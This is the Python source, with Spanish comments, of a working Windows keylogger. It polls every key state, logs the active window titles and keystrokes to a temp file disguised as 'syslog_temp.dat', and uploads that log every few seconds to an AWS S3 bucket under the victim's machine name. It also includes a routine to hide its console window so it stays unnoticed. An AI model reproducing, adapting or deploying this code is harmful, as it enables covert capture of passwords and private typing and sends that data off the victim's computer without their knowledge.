import os
import sys
import time
import ctypes
from ctypes import wintypes
from datetime import datetime
import boto3
from botocore.exceptions import ClientError, NoCredentialsError
import socket
import threading
from dotenv import load_dotenv

# Cargar variables de entorno desde archivo .env
# Buscar .env en el directorio del ejecutable
if getattr(sys, 'frozen', False):
    # Si está ejecutándose como ejecutable empaquetado
    directorio_actual = os.path.dirname(sys.executable)
else:
    # Si está ejecutándose como script
    directorio_actual = os.path.dirname(os.path.abspath(__file__))

ruta_env = os.path.join(directorio_actual, '.env')
load_dotenv(ruta_env)

# Constantes de Windows API
VK_ESCAPE = 0x1B # Código virtual para la tecla ESC
VK_SHIFT = 0x10 # Código virtual para la tecla Shift
VK_CAPITAL = 0x14 # Código virtual para la tecla Caps Lock
ASYNC_KEY_PRESSED = -32767 # Indica que la tecla está siendo presionada

# Cargar librerías de Windows
user32 = ctypes.windll.user32 # captura de teclas y ventanas
kernel32 = ctypes.windll.kernel32 # manejo de consola (ocultarla)

# Variable global para rastrear ventana activa y teclas procesadas
ventana_actual = None
teclas_procesadas = set()

# Configuración de AWS S3 (cargada desde variables de entorno)
S3_BUCKET = os.getenv("S3_BUCKET")
S3_FOLDER = os.getenv("S3_FOLDER", "")  # Default vacío si no existe
S3_REGION = os.getenv("S3_REGION")
AWS_ACCESS_KEY_ID = os.getenv("AWS_ACCESS_KEY_ID")
AWS_SECRET_ACCESS_KEY = os.getenv("AWS_SECRET_ACCESS_KEY")

INTERVALO_SUBIDA_S3 = 10  # Intervalo en segundos para subir logs a S3 (10 segundos para pruebas, ajustar a 300 o más para producción)
TAMANO_MAXIMO_MB = 10  # Limpiar archivo local si supera X MB
ultima_subida_s3 = time.time()

# Validar que las credenciales se cargaron correctamente
def validar_configuracion():
    errores = []
    if not S3_BUCKET:
        errores.append("S3_BUCKET no configurado")
    if not S3_REGION:
        errores.append("S3_REGION no configurado")
    if not AWS_ACCESS_KEY_ID:
        errores.append("AWS_ACCESS_KEY_ID no configurado")
    if not AWS_SECRET_ACCESS_KEY:
        errores.append("AWS_SECRET_ACCESS_KEY no configurado")
    
    if errores:
        print(f"[ERROR] Configuración incompleta en .env:")
        for error in errores:
            print(f"  - {error}")
        print(f"\nBuscando .env en: {ruta_env}")
        print(f"Archivo existe: {os.path.exists(ruta_env)}")
        return False
    return True

# Oculta la ventana de consola para ejecución en segundo plano.
# Utiliza la API FreeConsole de Windows.
def indetectabilidad():
    try:
        kernel32.FreeConsole()
        return True
    except Exception as e:
        print(f"Error al ocultar consola: {e}")
        return False

# Verifica y crea el directorio del archivo de log si no existe.
def crear_directorio_seguro(ruta_archivo):
    directorio = os.path.dirname(ruta_archivo)
    if directorio and not os.path.exists(directorio):
        try:
            os.makedirs(directorio, exist_ok=True)
            return True
        except Exception as e:
            print(f"Error al crear directorio: {e}")
            return False
    return True

# Obtiene el título de la ventana activa actual.
# Retorna el nombre de la aplicación donde se está escribiendo.
def obtener_ventana_activa():
    try:
        # Obtener handle de la ventana activa
        hwnd = user32.GetForegroundWindow()
        # Buffer para el título
        length = user32.GetWindowTextLengthW(hwnd)
        buffer = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buffer, length + 1)
        return buffer.value if buffer.value else "Ventana Desconocida"
    except:
        return "Ventana Desconocida"

# Verifica si la tecla Shift está presionada.
def esta_shift_presionado(): 
    return user32.GetAsyncKeyState(VK_SHIFT) & 0x8000 != 0

# Verifica si Caps Lock está activado.
def esta_caps_lock_activado():
    return user32.GetKeyState(VK_CAPITAL) & 0x0001 != 0

# Guarda la tecla presionada en el archivo de log y detecta mayúsculas basándose en Shift y Caps Lock.
def guardar_tecla_pulsada(tecla_pulsada, archivo_de_texto):
    shift_presionado = esta_shift_presionado()
    caps_activado = esta_caps_lock_activado()
    escribir_mayusculas = shift_presionado ^ caps_activado # Revisa si se debe escribir mayúscula (Shift o Caps Lock, pero no ambos)
    with open(archivo_de_texto, "a+", encoding="utf-8") as output_file:
        if tecla_pulsada == 0x01:
            output_file.write("\n[CIR]\n")
        elif tecla_pulsada == 0x02:
            output_file.write("\n[CDR]\n")
        elif tecla_pulsada == 0x08:
            output_file.write("\n[DEL]\n")
        elif tecla_pulsada == 0x09:
            output_file.write("\n[TAB]\n")
        elif tecla_pulsada == 0x0D:
            output_file.write("\n[ENTER]\n")
        elif tecla_pulsada == 0x10:
            output_file.write(" [SHIFT]")
        elif tecla_pulsada == 0x11:
            output_file.write("\n[CTRL]\n")
        elif tecla_pulsada == 0x12:
            output_file.write("\n[ALT]\n")
        elif tecla_pulsada == 0x14:
            output_file.write("\n[ ACTIVO MAYUSCULAS ]\n")
        elif tecla_pulsada == 0x1B:
            output_file.write("[ESC]")
        elif tecla_pulsada == 0x20:
            output_file.write("  ")
        elif tecla_pulsada == 0x25:
            output_file.write("\n[ TECLEO FLECHA IZQUIERDA ]\n")
        elif tecla_pulsada == 0x26:
            output_file.write("\n[ TECLEO FLECHA ARRIBA ]\n")
        elif tecla_pulsada == 0x27:
            output_file.write("\n[ TECLEO FLECHA DERECHA ]\n")
        elif tecla_pulsada == 0x28:
            output_file.write("\n[ TECLEO FLECHA ABAJO ]\n")
        elif tecla_pulsada == 0x2C:
            output_file.write("\n[ IMPRIMIO LA PANTALLA ]\n")
        elif tecla_pulsada == 0x30:
            output_file.write(")" if shift_presionado else "0")
        elif tecla_pulsada == 0x31:
            output_file.write("!" if shift_presionado else "1")
        elif tecla_pulsada == 0x32:
            output_file.write("@" if shift_presionado else "2")
        elif tecla_pulsada == 0x33:
            output_file.write("#" if shift_presionado else "3")
        elif tecla_pulsada == 0x34:
            output_file.write("$" if shift_presionado else "4")
        elif tecla_pulsada == 0x35:
            output_file.write("%" if shift_presionado else "5")
        elif tecla_pulsada == 0x36:
            output_file.write("^" if shift_presionado else "6")
        elif tecla_pulsada == 0x37:
            output_file.write("&" if shift_presionado else "7")
        elif tecla_pulsada == 0x38:
            output_file.write("*" if shift_presionado else "8")
        elif tecla_pulsada == 0x39:
            output_file.write("(" if shift_presionado else "9")
        elif tecla_pulsada == 0x41:
            output_file.write("A" if escribir_mayusculas else "a")
        elif tecla_pulsada == 0x42:
            output_file.write("B" if escribir_mayusculas else "b")
        elif tecla_pulsada == 0x43:
            output_file.write("C" if escribir_mayusculas else "c")
        elif tecla_pulsada == 0x44:
            output_file.write("D" if escribir_mayusculas else "d")
        elif tecla_pulsada == 0x45:
            output_file.write("E" if escribir_mayusculas else "e")
        elif tecla_pulsada == 0x46:
            output_file.write("F" if escribir_mayusculas else "f")
        elif tecla_pulsada == 0x47:
            output_file.write("G" if escribir_mayusculas else "g")
        elif tecla_pulsada == 0x48:
            output_file.write("H" if escribir_mayusculas else "h")
        elif tecla_pulsada == 0x49:
            output_file.write("I" if escribir_mayusculas else "i")
        elif tecla_pulsada == 0x4A:
            output_file.write("J" if escribir_mayusculas else "j")
        elif tecla_pulsada == 0x4B:
            output_file.write("K" if escribir_mayusculas else "k")
        elif tecla_pulsada == 0x4C:
            output_file.write("L" if escribir_mayusculas else "l")
        elif tecla_pulsada == 0x4D:
            output_file.write("M" if escribir_mayusculas else "m")
        elif tecla_pulsada == 0x4E:
            output_file.write("N" if escribir_mayusculas else "n")
        elif tecla_pulsada == 0x4F:
            output_file.write("O" if escribir_mayusculas else "o")
        elif tecla_pulsada == 0x50:
            output_file.write("P" if escribir_mayusculas else "p")
        elif tecla_pulsada == 0x51:
            output_file.write("Q" if escribir_mayusculas else "q")
        elif tecla_pulsada == 0x52:
            output_file.write("R" if escribir_mayusculas else "r")
        elif tecla_pulsada == 0x53:
            output_file.write("S" if escribir_mayusculas else "s")
        elif tecla_pulsada == 0x54:
            output_file.write("T" if escribir_mayusculas else "t")
        elif tecla_pulsada == 0x55:
            output_file.write("U" if escribir_mayusculas else "u")
        elif tecla_pulsada == 0x56:
            output_file.write("V" if escribir_mayusculas else "v")
        elif tecla_pulsada == 0x57:
            output_file.write("W" if escribir_mayusculas else "w")
        elif tecla_pulsada == 0x58:
            output_file.write("X" if escribir_mayusculas else "x")
        elif tecla_pulsada == 0x59:
            output_file.write("Y" if escribir_mayusculas else "y")
        elif tecla_pulsada == 0x5A:
            output_file.write("Z" if escribir_mayusculas else "z")
        elif tecla_pulsada == 0x60:
            output_file.write("0")
        elif tecla_pulsada == 0x61:
            output_file.write("1")
        elif tecla_pulsada == 0x62:
            output_file.write("2")
        elif tecla_pulsada == 0x63:
            output_file.write("3")
        elif tecla_pulsada == 0x64:
            output_file.write("4")
        elif tecla_pulsada == 0x65:
            output_file.write("5")
        elif tecla_pulsada == 0x66:
            output_file.write("6")
        elif tecla_pulsada == 0x67:
            output_file.write("7")
        elif tecla_pulsada == 0x68:
            output_file.write("8")
        elif tecla_pulsada == 0x69:
            output_file.write("9")
        elif tecla_pulsada == 0x6A:
            output_file.write("*")
        elif tecla_pulsada == 0x6B:
            output_file.write("+")
        elif tecla_pulsada == 0x6D:
            output_file.write("-")
        elif tecla_pulsada == 0x6E:
            output_file.write(".")
        elif tecla_pulsada == 0x6F:
            output_file.write("/")
        elif tecla_pulsada == 0x70:
            output_file.write("[F1]\n")
        elif tecla_pulsada == 0x71:
            output_file.write("[F2]\n")
        elif tecla_pulsada == 0x72:
            output_file.write("[F3]\n")
        elif tecla_pulsada == 0x73:
            output_file.write("[F4]\n")
        elif tecla_pulsada == 0x74:
            output_file.write("[F5]\n")
        elif tecla_pulsada == 0x75:
            output_file.write("[F6]\n")
        elif tecla_pulsada == 0x76:
            output_file.write("[F7]\n")
        elif tecla_pulsada == 0x77:
            output_file.write("[F8]\n")
        elif tecla_pulsada == 0x78:
            output_file.write("[F9]\n")
        elif tecla_pulsada == 0x79:
            output_file.write("[F10]\n")
        elif tecla_pulsada == 0x7A:
            output_file.write("[F11]\n")
        elif tecla_pulsada == 0x7B:
            output_file.write("[F12]\n")
        elif tecla_pulsada == 0xBC:
            output_file.write(",")
        elif tecla_pulsada == 0xBD:
            output_file.write("-")
        elif tecla_pulsada == 0xBE:
            output_file.write(".")
    
    return True

# Obtiene el nombre de la máquina para identificar el origen de los logs.
def obtener_nombre_maquina():
    try:
        return socket.gethostname()
    except:
        return "PC_Desconocido"

# Sube un archivo al bucket S3 de AWS.
# Retorna True si fue exitoso, False en caso contrario.
def subir_archivo_a_s3(archivo_local, nombre_archivo_s3):
    try:
        # Crear cliente S3 con credenciales explícitas
        s3_client = boto3.client(
            's3',
            aws_access_key_id=AWS_ACCESS_KEY_ID,
            aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
            region_name=S3_REGION
        )
        
        # Construir la ruta en S3 (asegurar que S3_FOLDER termine con / si existe)
        if S3_FOLDER:
            s3_key = S3_FOLDER.rstrip('/') + '/' + nombre_archivo_s3
        else:
            s3_key = nombre_archivo_s3
        
        # Verificar que el archivo existe y tiene contenido
        if not os.path.exists(archivo_local) or os.path.getsize(archivo_local) == 0:
            print("[!] Archivo temporal vacío, esperando más datos...")
            return False
        
        # Subir el archivo
        s3_client.upload_file(archivo_local, S3_BUCKET, s3_key)
        print(f"[✓] Archivo subido a S3: {s3_key}")
        return True
        
    except NoCredentialsError:
        print("[!] Error: Credenciales de AWS no encontradas")
        print("    Verifica AWS_ACCESS_KEY_ID y AWS_SECRET_ACCESS_KEY en el código")
        return False
    except ClientError as e:
        error_code = e.response.get('Error', {}).get('Code', 'Unknown')
        error_msg = e.response.get('Error', {}).get('Message', str(e))
        print(f"[!] Error de AWS S3 ({error_code}): {error_msg}")
        return False
    except Exception as e:
        print(f"[!] Error inesperado al subir a S3: {e}")
        return False

# Genera el nombre del archivo en S3.
# Si con_timestamp=True, crea un nombre único con fecha/hora.
# Si con_timestamp=False, usa siempre el mismo nombre (para sobrescribir).
# Formato: keys_NOMBREPC.txt o keys_NOMBREPC_TIMESTAMP.txt
def generar_nombre_archivo_s3(con_timestamp=False):
    nombre_maquina = obtener_nombre_maquina()
    if con_timestamp:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return f"keys_{nombre_maquina}_{timestamp}.txt"
    else:
        return f"keys_{nombre_maquina}.txt"

# Registra el inicio de una sesión de captura con timestamp.
def registrar_inicio_sesion(archivo_log):
    try:
        with open(archivo_log, "a+", encoding="utf-8") as log_file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            separador = "=" * 60
            log_file.write(f"\n\n{separador}\n")
            log_file.write(f"SESION INICIADA: {timestamp}\n")
            log_file.write(f"Sistema: Windows | Usuario: {os.getlogin()}\n")
            log_file.write(f"Máquina: {obtener_nombre_maquina()}\n")
            log_file.write(f"Destino: S3 Bucket - {S3_BUCKET}/{S3_FOLDER}\n")
            log_file.write(f"{separador}\n\n")
        return True
    except Exception as e:
        print(f"Error al registrar inicio de sesión: {e}")
        return False

# Registra cuando el usuario cambia de aplicación.
def registrar_cambio_ventana(ventana, archivo_log):
    try:
        with open(archivo_log, "a+", encoding="utf-8") as log_file:
            timestamp = datetime.now().strftime("%H:%M:%S")
            log_file.write(f"\n\n>>> [{timestamp}] Aplicación: {ventana} <<<\n")
    except Exception as e:
        print(f"Error al registrar cambio de ventana: {e}")

def main():
    # Captura teclas presionadas y las registra en un archivo de log.
    # Sube periódicamente las teclas capturadas a AWS S3.
    global ventana_actual, teclas_procesadas, ultima_subida_s3
    
    # Validar configuración de AWS antes de comenzar
    if not validar_configuracion():
        print("\n[FATAL] No se puede continuar sin configuración válida.")
        input("Presiona Enter para salir...")
        return 1
    
    print("[✓] Configuración de AWS S3 validada correctamente")
    print(f"    Bucket: {S3_BUCKET}")
    print(f"    Región: {S3_REGION}")
    print(f"    Carpeta: {S3_FOLDER if S3_FOLDER else '(raíz del bucket)'}")
    print()
    
    # Configuración
    archivo_log_temp = os.path.join(os.getenv('TEMP'), 'syslog_temp.dat')
    intervalo_escaneo = 0.01  # 10ms para reducir uso de CPU
    
    # Preparación del entorno
    crear_directorio_seguro(archivo_log_temp)
    registrar_inicio_sesion(archivo_log_temp)

    # Activar modo indetectable (ocultar consola)
    # indetectabilidad()
    
    try:
        # Bucle principal de captura
        while True:
            # Detectar cambio de ventana activa
            ventana_nueva = obtener_ventana_activa()
            if ventana_nueva != ventana_actual:
                ventana_actual = ventana_nueva
                registrar_cambio_ventana(ventana_actual, archivo_log_temp)
                print(f"Ventana activa: {ventana_actual}")
            
            # Limpiar conjunto de teclas procesadas cada ciclo
            teclas_activas_ahora = set()
            
            # Escanear todas las teclas posibles (8-255)
            for codigo_tecla in range(8, 256):
                # Verificar si la tecla está siendo presionada
                estado_tecla = user32.GetAsyncKeyState(codigo_tecla)
                
                if estado_tecla == ASYNC_KEY_PRESSED:
                    teclas_activas_ahora.add(codigo_tecla)
                    
                    # Solo procesar si no ha sido procesada en este ciclo
                    if codigo_tecla not in teclas_procesadas:
                        # Guardar la tecla presionada
                        guardar_tecla_pulsada(codigo_tecla, archivo_log_temp)
                        teclas_procesadas.add(codigo_tecla)
            
            # Limpiar teclas que ya no están presionadas
            teclas_procesadas = teclas_activas_ahora.copy()
            
            # Verificar si es momento de subir a S3
            tiempo_actual = time.time()
            if tiempo_actual - ultima_subida_s3 >= INTERVALO_SUBIDA_S3:
                print("\n[→] Subiendo logs a S3...")
                nombre_archivo_s3 = generar_nombre_archivo_s3()
                
                # Subir el archivo (sobrescribe el anterior en S3)
                subir_archivo_a_s3(archivo_log_temp, nombre_archivo_s3)
                
                # Verificar si el archivo local es muy grande y necesita crear uno nuevo
                try:
                    tamano_mb = os.path.getsize(archivo_log_temp) / (1024 * 1024)
                    if tamano_mb > TAMANO_MAXIMO_MB:
                        print(f"[⚠] Archivo local muy grande ({tamano_mb:.2f} MB), creando archivo nuevo...")
                        # Subir el archivo lleno a S3 con timestamp único
                        nombre_archivo_lleno = generar_nombre_archivo_s3(con_timestamp=True)
                        if subir_archivo_a_s3(archivo_log_temp, nombre_archivo_lleno):
                            print(f"[✓] Archivo lleno guardado como: {nombre_archivo_lleno}")
                        # Crear nuevo archivo temporal vacío
                        open(archivo_log_temp, 'w').close()
                        registrar_inicio_sesion(archivo_log_temp)
                        print("[✓] Nuevo archivo temporal creado")
                except:
                    pass
                
                ultima_subida_s3 = tiempo_actual
                print("[✓] Archivo actualizado en S3\n")
            
            # Pequeña pausa para reducir uso de CPU
            time.sleep(intervalo_escaneo)
            
    except KeyboardInterrupt:
        print("\n\nKeylogger detenido por el usuario.")
        registrar_fin_sesion(archivo_log_temp)
        # Subir último lote antes de finalizar
        print("[→] Subiendo último lote a S3...")
        subir_archivo_a_s3(archivo_log_temp, generar_nombre_archivo_s3())
        return 0
    except Exception as e:
        print(f"\nError crítico: {e}")
        registrar_fin_sesion(archivo_log_temp)
        # Intentar subir antes de finalizar
        try:
            subir_archivo_a_s3(archivo_log_temp, generar_nombre_archivo_s3())
        except:
            pass
        return 1

# Registra el fin de una sesión de captura con timestamp.
def registrar_fin_sesion(archivo_log):
    try:
        with open(archivo_log, "a+", encoding="utf-8") as log_file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            separador = "=" * 60
            log_file.write(f"\n{separador}\n")
            log_file.write(f"SESION FINALIZADA: {timestamp}\n")
            log_file.write(f"{separador}\n\n")
    except Exception as e:
        print(f"Error al registrar fin de sesión: {e}")

# Punto de entrada del programapython test_config.py
if __name__ == "__main__":
    sys.exit(main())